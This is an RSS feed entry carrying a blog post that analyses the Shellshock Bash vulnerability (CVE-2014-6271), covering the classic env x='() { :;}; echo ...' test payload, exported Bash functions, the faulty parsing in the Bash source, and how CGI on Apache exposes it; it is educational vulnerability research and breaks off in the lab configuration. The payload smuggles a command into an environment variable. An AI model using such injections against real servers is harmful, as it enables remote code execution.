<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SSH ForceCommand on</title><link>https://h4r1337.github.io/tags/ssh-forcecommand/</link><description>Recent content in SSH ForceCommand on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 22 Sep 2025 09:50:50 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/ssh-forcecommand/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2014-6271 - Shellshock</title><link>https://h4r1337.github.io/posts/shellshock/</link><pubDate>Mon, 22 Sep 2025 09:50:50 +0530</pubDate><guid>https://h4r1337.github.io/posts/shellshock/</guid><description>&lt;p>This is the first post in my CVE Analysis blog series. Since this is the first post in this series and I have no prior experience with CVE analysis, I will be writing about Shellshock. This is an old vulnerability in Bash, and there are already many articles and blogs written about it. Therefore, this is not something you would want to read if you are already familiar with this vulnerability, as no novel techniques or previously unknown facts are discussed here. Rather, this is just my attempt to establish a format for writing future posts. And after weeks &lt;del>months&lt;/del> of procrastination, I finally finished it. With that disclaimer in place, let&amp;rsquo;s get started.&lt;/p></description><content>&lt;p>This is the first post in my CVE Analysis blog series. Since this is the first post in this series and I have no prior experience with CVE analysis, I will be writing about Shellshock. This is an old vulnerability in Bash, and there are already many articles and blogs written about it. Therefore, this is not something you would want to read if you are already familiar with this vulnerability, as no novel techniques or previously unknown facts are discussed here. Rather, this is just my attempt to establish a format for writing future posts. And after weeks &lt;del>months&lt;/del> of procrastination, I finally finished it. With that disclaimer in place, let&amp;rsquo;s get started.&lt;/p>
&lt;hr>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align: left">&lt;strong>CVE&lt;/strong>&lt;/th>
&lt;th style="text-align: left">CVE-2014-6271&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align: left">&lt;strong>Disclosure Date&lt;/strong>&lt;/td>
&lt;td style="text-align: left">12 September 2014&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">&lt;strong>Patch Date&lt;/strong>&lt;/td>
&lt;td style="text-align: left">24 September 2014&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">&lt;strong>Product&lt;/strong>&lt;/td>
&lt;td style="text-align: left">Bash&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">&lt;strong>Advisory&lt;/strong>&lt;/td>
&lt;td style="text-align: left">&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">https://nvd.nist.gov/vuln/detail/CVE-2014-6271&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">&lt;strong>Affected Versions&lt;/strong>&lt;/td>
&lt;td style="text-align: left">1.03 - 4.3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">&lt;strong>First Patched Version&lt;/strong>&lt;/td>
&lt;td style="text-align: left">4.3-025&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">&lt;strong>Issue/Bug Report&lt;/strong>&lt;/td>
&lt;td style="text-align: left">&lt;a href="https://seclists.org/oss-sec/2014/q3/650">https://seclists.org/oss-sec/2014/q3/650&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: left">&lt;strong>Reporter(s)&lt;/strong>&lt;/td>
&lt;td style="text-align: left">Stephane Chazeles&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;blockquote>
&lt;p>GNU Bash versions 1.03 through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka &amp;ldquo;ShellShock.&amp;rdquo;&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;h2 id="exploitation">Exploitation&lt;/h2>
&lt;p>A quick Google search on how to test if your Bash version is vulnerable to Shellshock will show you a proof of concept like this&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env x&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;() { :;}; echo vulnerable&amp;#39;&lt;/span> bash -c &lt;span style="color:#b8bb26">&amp;#39;echo test&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s check one by one what this command means.&lt;/p>
&lt;h3 id="environment-variables">Environment Variables&lt;/h3>
&lt;p>First we have to understand what an environment variable is.
An environment variable is a dynamic, named value maintained by the operating system; it is not a feature specific to any shell or to Linux itself. It can be used by other processes to obtain various configurations. For example, in Linux the &lt;code>$HOME&lt;/code> environment variable is used to store the location of the home directory of the current user. Bash is simply another process that can read or modify its own environment variables.
In Bash we can set our own custom environment using the built-in &lt;code>export&lt;/code> command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">export&lt;/span> foo&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;hello world&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now any child processes spawned by the current Bash instance can access the environment variable named &lt;code>foo&lt;/code>. This variable can be referenced by adding a &lt;code>$&lt;/code> at the start of the variable name:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> $foo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># hello world&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also set an environment variable for a single program without exporting it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>foo&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;hello world&amp;#39;&lt;/span> program
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will spawn the child process &lt;code>program&lt;/code> with the environment variable &lt;code>foo&lt;/code> in it.
Now you may notice that in the above Shellshock payload they are using the &lt;code>env&lt;/code> command to set the environment variable. The &lt;code>env&lt;/code> command is a standalone utility designed to manage the environment with more control when launching a process:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># To start the program in a sandboxed environment with no environment variables&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>env -i program
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># To start the program with the FOO environment variable&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>env FOO&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;test&amp;#39;&lt;/span> program
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># To remove the FOO variable from the environment before running program&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>env -u FOO program
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="function-as-environment-variables">Function as Environment Variables&lt;/h3>
&lt;p>So far, we have learned about how to export normal static values as environment variables. In Bash, we can also export shell functions into the environment—a Bash extension that isn&amp;rsquo;t part of the POSIX standard. These exported functions are only passed to child Bash processes; other programs or non-Bash shells will ignore them. There are several ways to define these variables, including using the &lt;code>export&lt;/code> command with the &lt;code>-f&lt;/code> flag to say that the given name refers to a Bash function.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>hello&lt;span style="color:#fe8019">()&lt;/span> &lt;span style="color:#fe8019">{&lt;/span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Hello, World&amp;#34;&lt;/span>; &lt;span style="color:#fe8019">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">export&lt;/span> -f hello
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash -c &lt;span style="color:#b8bb26">&amp;#39;hello&amp;#39;&lt;/span> &lt;span style="color:#928374;font-style:italic"># This will start a new child bash proccess and call the exported hello function&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Hello, World&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Using the &lt;code>env&lt;/code> command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env hello&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;() { echo &amp;#34;Hello, World&amp;#34;; }&amp;#39;&lt;/span> bash -c &lt;span style="color:#b8bb26">&amp;#39;hello&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Hello, World&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Or we can simply follow the same &lt;code>FOO='value' program&lt;/code> format, without any additional utility program, which will also work:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>hello&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;() { echo &amp;#34;Hello, World&amp;#34;; }&amp;#39;&lt;/span> bash -c hello
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Hello, World&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;div class="alert alert-note collapsed">
&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
&lt;i class="bx bx-info-circle">&lt;/i>
&lt;p class="alert-heading">
Note
&lt;/p>
&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
&lt;/div>
&lt;div class="alert-content" style="display: none;" >
&lt;p>Exporting shell functions like this only work in Bash before Shellshock.
In modern Bash only the &lt;code>export -f&lt;/code> method will work.&lt;/p>
&lt;/div>
&lt;/div>
&lt;script>
function toggleAlert(headerElement) {
var alertBox = headerElement.parentElement;
var alertContent = alertBox.querySelector('.alert-content');
var icon = headerElement.querySelectorAll('i')[1];
alertBox.classList.toggle('open');
alertBox.classList.toggle('collapsed');
if (alertBox.classList.contains('open')) {
alertContent.style.display = 'block';
icon.classList.remove('open');
icon.classList.add('collapsed');
} else {
icon.classList.remove('collapsed');
icon.classList.add('open');
alertContent.style.display = 'none';
}
}
&lt;/script>
&lt;h3 id="the-payload">The payload&lt;/h3>
&lt;p>Now that we have covered the essentials, let&amp;rsquo;s walk through the payload step by step:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env x&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;() { :;}; echo vulnerable&amp;#39;&lt;/span> bash -c &lt;span style="color:#b8bb26">&amp;#39;echo test&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In this command, we define a shell function in the environment variable &lt;code>x&lt;/code> and pass it to a new Bash process. Here, &lt;code>:&lt;/code> (colon) is a Bash built-in command that does nothing, so &lt;code>x&lt;/code> is just an empty function. The crucial point—and the heart of the Shellshock vulnerability—is what comes after the function definition. We don&amp;rsquo;t stop at the end of the function (&lt;code>}&lt;/code>); we append a trailing &lt;code>; echo vulnerable&lt;/code> to it. A vulnerable Bash program, when parsing its environment variables, doesn&amp;rsquo;t stop at the function&amp;rsquo;s closing brace—it continues past the semicolon and executes &lt;code>echo vulnerable&lt;/code> as a separate command. The important thing is we don&amp;rsquo;t have to call the function &lt;code>x&lt;/code> to invoke this; the extra command runs automatically during parsing.&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/shellshock/Pasted%20image%2020250613172338.webp">&lt;/figure>
&lt;p>In a vulnerable Bash version this command will print both &amp;ldquo;vulnerable&amp;rdquo; and &amp;ldquo;test&amp;rdquo;.&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/shellshock/Pasted%20image%2020250613173028.webp">&lt;/figure>
&lt;h2 id="root-cause-analysis">Root Cause Analysis&lt;/h2>
&lt;p>Now let&amp;rsquo;s take a look at the &lt;a href="https://cgit.git.savannah.gnu.org/cgit/bash.git/tree/?h=bash-4.3-alpha">Bash source code&lt;/a> to see where the vulnerability exists. We will look specifically at the code that is responsible for parsing environment variables. The main function inside the &lt;code>shell.c&lt;/code> file calls &lt;code>shell_initialize()&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">static&lt;/span> &lt;span style="color:#fabd2f">void&lt;/span> &lt;span style="color:#fabd2f">shell_initialize&lt;/span> () {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[...]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic">/* Initialize internal and environment variables. Don&amp;#39;t import shell
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"> functions from the environment if we are running in privileged or
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"> restricted mode or if the shell is running setuid. */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#if defined (RESTRICTED_SHELL)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span> &lt;span style="color:#fabd2f">initialize_shell_variables&lt;/span> (shell_environment, privileged_mode&lt;span style="color:#fe8019">||&lt;/span>&lt;span style="color:#fe8019">restricted&lt;/span>&lt;span style="color:#fe8019">||&lt;/span>running_setuid);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#else
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span> &lt;span style="color:#fabd2f">initialize_shell_variables&lt;/span> (shell_environment, privileged_mode&lt;span style="color:#fe8019">||&lt;/span>running_setuid);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#endif
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[...]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>shell_environment&lt;/code> variable contains the environment variables, and it is passed to another function called &lt;code>initialize_shell_variables(env, privmod)&lt;/code>. &lt;code>privmod&lt;/code> tells if Bash is currently running in privileged mode, using the &lt;code>-p&lt;/code> flag. This will come later when we discuss the different ways that were used to fix Shellshock. This function is defined inside the &lt;code>variable.c&lt;/code> file:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">/* Initialize the shell variables from the current environment.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"> If PRIVMODE is nonzero, don&amp;#39;t import functions from ENV or
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"> parse $SHELLOPTS. */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">void&lt;/span> &lt;span style="color:#fabd2f">initialize_shell_variables&lt;/span> (env, privmode)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">char&lt;/span> &lt;span style="color:#fe8019">**&lt;/span>env;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">int&lt;/span> privmode;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[...]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">for&lt;/span> (string_index &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#d3869b">0&lt;/span>; string &lt;span style="color:#fe8019">=&lt;/span> env[string_index&lt;span style="color:#fe8019">++&lt;/span>]; )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic">/* If exported function, define it now. Don&amp;#39;t import functions from
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"> the environment in privileged mode. */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (privmode &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#d3869b">0&lt;/span> &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span> read_but_dont_execute &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#d3869b">0&lt;/span> &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">STREQN&lt;/span> (&lt;span style="color:#b8bb26">&amp;#34;() {&amp;#34;&lt;/span>, string, &lt;span style="color:#d3869b">4&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic">// This is where shellshock happens
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">&lt;/span> &lt;span style="color:#fabd2f">parse_and_execute&lt;/span> (temp_string, name, SEVAL_NONINT&lt;span style="color:#fe8019">|&lt;/span>SEVAL_NOHIST);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After some string manipulation the environment variables are passed to the &lt;code>parse_and_execute()&lt;/code> function. For example, if the environment variable contains a value like:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-env" data-lang="env">&lt;span style="display:flex;">&lt;span>FOO&lt;span style="color:#fe8019">=()&lt;/span> &lt;span style="color:#fe8019">{&lt;/span> &lt;span style="color:#fabd2f">echo&lt;/span> hi; &lt;span style="color:#fe8019">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then it will be converted to &lt;code>FOO () { echo hi; }&lt;/code>; and this will be stored in &lt;code>temp_string&lt;/code> and will be passed to the &lt;code>parse_and_execute()&lt;/code> function for execution. Here, the only check done to differentiate an exported function from an exported variable is whether its value starts with &lt;code>() {&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">int&lt;/span> &lt;span style="color:#fabd2f">parse_and_execute&lt;/span> (string, from_file, flags)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">char&lt;/span> &lt;span style="color:#fe8019">*&lt;/span>string;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">const&lt;/span> &lt;span style="color:#fabd2f">char&lt;/span> &lt;span style="color:#fe8019">*&lt;/span>from_file;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">int&lt;/span> flags;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">with_input_from_string&lt;/span> (string, from_file);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">while&lt;/span> (&lt;span style="color:#fe8019">*&lt;/span>(bash_input.location.string))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> (&lt;span style="color:#fabd2f">parse_command&lt;/span> () &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#d3869b">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> last_result &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#fabd2f">execute_command_internal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (command, &lt;span style="color:#d3869b">0&lt;/span>, NO_PIPE, NO_PIPE, bitmap);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">dispose_command&lt;/span> (command);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> last_result &lt;span style="color:#fe8019">=&lt;/span> EXECUTION_FAILURE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [...]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> (last_result);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The way they are trying to add this function to the environment variable is by directly executing it.
You can try this by just entering the string &lt;code>FOO () { echo hi; }&lt;/code> into a Bash shell and calling &lt;code>FOO&lt;/code>:&lt;/p>
&lt;figure>
&lt;img src="https://h4r1337.github.io/img/shellshock/Pasted%20image%2020250825143248.webp">&lt;/figure>
&lt;p>This is similar to how Bash adds the function to its &lt;em>function table&lt;/em>.
The above string containing the function definition is treated as an input to the parser, and if it parses successfully, it just executes it using the &lt;code>execute_command_internal()&lt;/code> function without any further checks or sanitation. &lt;code>parse_command()&lt;/code> doesn&amp;rsquo;t stop after the function definition. If the string contains trailing commands after the function definition, it will happily parse the entire input, and it will be executed.&lt;/p>
&lt;h2 id="attack-vectors">Attack Vectors&lt;/h2>
&lt;p>Now you might wonder how this specific parsing vulnerability in Bash could lead to widespread exploitation—and in most cases that would seem like a reasonable question. But the problem arises when other applications use Bash under the hood to deal with user inputs. We will talk about various such applications shortly.&lt;/p>
&lt;p>For a system to be vulnerable to Shellshock, &lt;a href="https://infosecnirvana.com/attack-vectors-used-shellshock/">3 conditions&lt;/a> must be met:&lt;/p>
&lt;ol>
&lt;li>The application must set an environment variable with attacker-controlled values.&lt;/li>
&lt;li>It must invoke the Bash shell.&lt;/li>
&lt;li>And most importantly, the system must be running on a vulnerable version of Bash.&lt;/li>
&lt;/ol>
&lt;p>Shortly after the Shellshock vulnerability was found, people started to find more and more applications that came under these exploitable conditions.&lt;/p>
&lt;h3 id="common-gateway-interface-cgi">Common Gateway Interface (CGI)&lt;/h3>
&lt;p>The major attack vector of this vulnerability is through CGI-based web servers, which at that time were popular and widely used.
CGI is an interface specification for interacting between HTTP requests and programs, which can range from compiled C binaries to Bash scripts. According to the &lt;a href="https://www.rfc-editor.org/rfc/rfc3875">specification&lt;/a>, information from the server to the program is carried through something called a meta-variable. The most common implementation of these is through the system&amp;rsquo;s environment variables. That is, information like HTTP headers, HTTP methods, and other user inputs via request parameters are passed to the program as system environment variables. Then the server starts a new child process of the program with the crafted environment variables. If the program invokes Bash (directly or indirectly), Bash will import and parse all environment variables, which in vulnerable versions could lead to command execution.
Web servers like Apache, Microsoft IIS, etc. have support for CGI scripting. We will take a look at Apache in this blog by setting up a Docker container with a vulnerable Bash version. You can check out the lab &lt;a href="https://github.com/h4r1337/cve-labs/tree/main/CVE-2014-6271/cgi-docker">in my GitHub repo&lt;/a>.
To enable CGI in Apache, first we need to enable the necessary modules in the &lt;code>httpd.conf&lt;/code> file:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>LoadModule cgid_module modules/mod_cgid.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We also need to specify that a particular directory is set aside for CGI programs. Apache will assume that every file in this directory is a CGI program and will try to execute it when that particular program is requested by a client. We can use the &lt;code>ScriptAlias&lt;/code> directive in Apache to specify this.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>ScriptAlias /cgi-bin/ &amp;#34;/usr/local/apache2/cgi-bin/&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With this, whenever the client sends a request like &lt;code>https://test.com/cgi-bin/program.sh&lt;/code>, the server will check if the &lt;code>program.sh&lt;/code> is present inside the &lt;code>/usr/local/apache2/cgi-bin/&lt;/code> directory, and if it is present, will try to execute it. To permit execution of the programs inside &lt;code>cgi-bin/&lt;/code>, we need to explicitly specify that using the &lt;code>Options +ExecCGI&lt;/code> directive:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&amp;lt;Directory &lt;span style="color:#b8bb26">&amp;#34;/usr/local/apache2/cgi-bin&amp;#34;&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AllowOverride None
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#928374;font-style:italic"># Enable CGI execution&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Options +ExecCGI
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Require all granted
